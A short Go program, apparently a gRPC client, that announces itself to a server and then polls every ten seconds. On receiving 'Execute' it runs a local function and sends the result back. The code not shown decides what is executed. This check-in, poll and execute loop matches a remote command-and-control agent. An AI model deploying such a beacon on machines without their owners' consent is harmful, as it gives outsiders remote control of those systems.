package main

import (
	connections "my_grpc/internal/connection"
	utils "my_grpc/internal/utils"
	"time"
)

func main() {

	c := connections.InitClientGrpc()

	defer c.Conn.Close()

	dur := utils.ParserDur("10s")

	initMessage := true

	for {

		// Первое сообщение серверу Init Message
		if initMessage {
			c.SendMsg("macbook-air", "Hello")
			initMessage = false
		}

		msg := c.ReadMsg()

		switch msg {

		case "Execute":
			result := utils.Execut()
			c.SendMsg("from_exec", result)

		}

		time.Sleep(dur)
	}

}
